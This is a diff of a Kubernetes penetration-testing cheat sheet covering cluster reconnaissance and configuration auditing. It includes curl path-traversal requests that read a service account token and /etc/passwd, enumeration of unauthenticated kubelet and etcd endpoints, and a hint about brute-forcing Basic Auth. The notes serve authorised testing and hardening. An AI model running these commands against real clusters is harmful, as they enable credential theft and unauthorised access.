@@ -34,7 +34,7 @@ Nmap
  
 		curl --path-as-is 127.0.0.1:3000/public/plugins/graph/../../../../../../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
 
-		curl --path-as-is 127.0.0.1:3000/public/plugins/graph/../../../../../../../../../../../../../et/passwd
+		curl --path-as-is 127.0.0.1:3000/public/plugins/graph/../../../../../../../../../../../../../etc/passwd
 
 
 
@@ -42,13 +42,18 @@ DNS
 	coredns on default kubeadm clusters listens on 10.96.0.10
 
 	List all service DNS records with their corresponding svc IP
-		dig +short <server_name> any.any.svc.cluster.local
+		for IP in $(dig +short any.any.svc.cluster.local); do dig +short -x $IP; done
 
 		doesn't give service names, but does give list of IPs for targetted portscans
+			dig +short <server_name> any.any.svc.cluster.local
+
+		From v1.9.0 of CoreDNS onwards this may not work. Kubernetes v1.24 was still using CoreDNS v1.8.6, but the v1.25 version updated CoreDNS to v1.9.3. 
+
 
 	query all the cluster service names and ports from DNS from any pod
 		https://github.com/raesene/alpine-containertools/blob/master/scripts/k8s-dns-enum.rb
 
+	If you have a multi-tenant cluster, with tenants divided by namespace, they will still be able to brute-force discover one another's pods (especially if the namespace is something simple like the tenant company's name). They won't necessarily be able to access one another's pods, but there is some information leakage in the form of DNS entries. 
 
 Indicators you're in a pod
 	/etc/hosts
@@ -78,25 +83,28 @@ Kubernetes Servers on the Internet
 Query Secure Port
 	kubectl -s http://<node_IP>:8443 <command>
 	OR
-	curl -k https://10.129.173.36:8443/api/v1/namespaces   
+	curl -k https://<node_IP>:8443/api/v1/namespaces   
 
 Query Insecure Port
 	kubectl -s http://<node_IP>:8080 <command>
 
 Query unauthenticated rw kubelet API
-	curl https://172.18.0.4:10250/pods -k | jq
+	curl https://<node_IP>:10250/pods -k | jq
 	
 Query unauthenticated ro kubelet API
-	curl http://172.18.0.4:10255/pods -k | jq
+	curl http://<node_IP>:10255/pods -k | jq
 		run and exec endpoints will return 405
 
 Query unauthenticated etcd
 	export ETCDCTL_API=3
 
-	etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=172.18.0.4:2379 get / --prefix --keys-only
+	etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=<node_IP>:2379 get / --prefix --keys-only
 
 Check for Tiller
 	helm --host <target_IP>:<tiller_port> version
+
+	on node: 
+		helm version
 
 	from a pod in the cluster:
 		dig tiller-deploy.kube-system.svc.cluster.local
@@ -137,19 +145,25 @@ Find and read any available secrets
 
 
 List capabilities for a container
+
+	capsh --print
+
 	Run amicontained in the container (also gets AppArmor Profile, seccomp, namespaces)
 		curl -LO k8s.work/amicontained
 		chmod +x amicontained
 		./amicontained
 
-
 	Find container process (e.g. bash)
 		ps 	
-	Get capabilities the the process
+	Get capabilities of the process
 		getpcaps <PID>
 
+	if your application runs perfectly well as a non-root user, it should run fine in a container with all capabilities dropped.
 
+	ping may no longer require cap_net_raw - “ping_group_range” feature allows a Linux system to define a range of groups that can send ICMP echo requests without privileges
 
+	low port binding may no longer require cap_net_bind - net.ipv4.ip_unprivileged_port_start (set to 1024) if we try to bind any port below 1024, such as port 80, it wouldn’t work unless we were root or the process had the NET_BIND_SERVICE capability.
+	net.ipv4.ip_unprivileged_port_start (set to 0) allows low port binding by non-privileged users
 
 Check Service Account Permissions
 	often the default service account is given too many rights
@@ -165,6 +179,10 @@ Identify authenticated API with Basic Auth enabled
 		403 - not enabled
 		401 - enabled, user/pass incorrect
 	if no account lockout, can bruteforce
+
+
+About the pods
+	kdescribe(){(kubectl get pods $1 $2 $3 -oyaml ; kubectl get events --field-selector http://involvedObject.name=$1 $2 $3; k logs $1 $2 $3 --tail 20) | less}
 
 
 Inside a pod
@@ -191,7 +209,7 @@ Inside a pod
 
 
 Check for Basic Auth
-	curl -sk --user user1:mypass https://<IP>:<port>/api/...
+	curl -sk --user user1:mypass https://<IP>:<port>/api/v1/namespaces
 
 	identify servers with Basic Auth enabled
 			curl and pass creds to API server as above
@@ -210,7 +228,7 @@ Check repos for CA key files
 	provides access to whole cluster for life of key (10y by default)
 
 Check RBAC rights applied to clusters
-	esp. 3rd-party intalls - sim to dangers of curl-bashing
+	esp. 3rd-party installs - sim to dangers of curl-bashing
 	install may do things like bind default service account to cluster-admin
 
 Manual Permission Auditing
@@ -264,10 +282,10 @@ Custom Resources
 		kubectl api-resources
 
 
-Finding services running (to check for unauth access, etc)
-	kubectl svc --all-namespaces
+Finding services running (to check for unauthenticated access, etc)
+	kubectl get svc --all-namespaces
 
-If you have a multi-tenant cluster, with tenants divided by namespace, they will still be able to brute-force discover one another's pods (especially if the namespace is something simple like the tenant company's name). They won't necessarily be able to access one another's pods, but there is some information leakage in the form of DNS entries. 
+
 
 
 K8s CIS Benchmarks
@@ -300,20 +318,12 @@ K8s CIS Benchmarks
 
 
 K8s Config Testing Tools
-	github.com/raesene/TestingScipts/offline-cluster-analyzer.rb
+	github.com/raesene/TestingScripts/offline-cluster-analyzer.rb
 		run included kubectl commands to gathers information on most resources in JSON for offline analysis
 			no sensitive information (no secrets)
 			client could run kubectl command and provide output
 				can be very useful for scoping!
 		parse JSON with offline-cluster-analyzer.rb
-
-
-	Kind (github.com/kubernetes-sigs/kind)
-		K8s in Docker, sim DIND
-		creates K8s nodes inside Docker containers 
-		makes use of privileged containers for nested docker
-		not suitable for production use!
-			good for demos - easy to set up
 
 	KubiScan (github.com/cyberark/KubiScan)
 		looks for dangerous RBAC rights
@@ -329,6 +339,17 @@ K8s Config Testing Tools
 		K8s hardened configuration reviewer - NSA/CISA standards
 		based on OPA engine
 
+	Kind (github.com/kubernetes-sigs/kind)
+		K8s in Docker, sim DIND
+		creates K8s nodes inside Docker containers 
+		makes use of privileged containers for nested docker
+		not suitable for production use!
+			good for demos - easy to set up
+
+Managed K8s Auditing Tool
+	https://github.com/DataDog/managed-kubernetes-auditing-toolkit
+	AWS only for now (Oct 2023)
+
 
 K8s PT Tools
 	kube-hunter (github.com/aquasecurity/kube-hunter)
@@ -341,7 +362,10 @@ K8s PT Tools
 		will make calls out to Azure in process of testing
 
 
-AWS K8s
+
+
+
+AKS
 	Initiate Connection
 		aws configure
 			provide Access Key ID, Secret Access Key, Region 
@@ -364,7 +388,16 @@ AWS K8s
 	Get helm/tiller version (from in a pod on the system)
 		helm --host tiller-deploy.kub-system.svc.cluster.local:44134 version
 
+EKS 
+	When you create an Amazon EKS cluster, the IAM entity user or role that creates the cluster, is automatically granted system:masters permissions in the cluster's RBAC configuration
+		cannot be removed
+		not managed through the aws-auth ConfigMap
+	
+	impossible to determine who has administrator privileges on an EKS cluster, unless you're able to look up the initial eks:CreateCluster CloudTrail event to find who initially created the cluster
 
+	administrator access to your AWS account does not necessarily have any access to the EKS clusters in the account
+		make sure you're explicitly granting permissions to anyone who needs access to your EKS clusters (e.g. break-glass admins) in their aws-auth ConfigMap
 
+	
 
 
